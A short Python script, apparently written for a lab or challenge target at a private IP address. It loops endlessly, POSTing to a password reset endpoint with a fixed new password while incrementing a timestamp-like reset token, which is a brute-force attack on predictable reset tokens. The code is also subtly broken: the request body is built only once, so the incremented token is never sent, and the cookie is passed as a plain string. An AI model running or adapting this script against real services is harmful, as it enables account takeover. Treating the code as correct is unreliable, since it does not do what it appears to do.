import  requests
token = 1717292007
url = f"http://10.1.131.24/resetpassword_process.php"
print(url)
token = 1717292402
data = f"new_password=aaa&confirm_password=aaa&token={token}&user=aaa"
header = {
    "Host": "10.1.131.24",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": "application/x-www-form-urlencoded"

}
cookie =  "ZHdkd2dhZGFnLmh0bWw%3D"

while True:
    token += 1
    req = requests.post(url, headers=header, cookies=cookie,data=data)
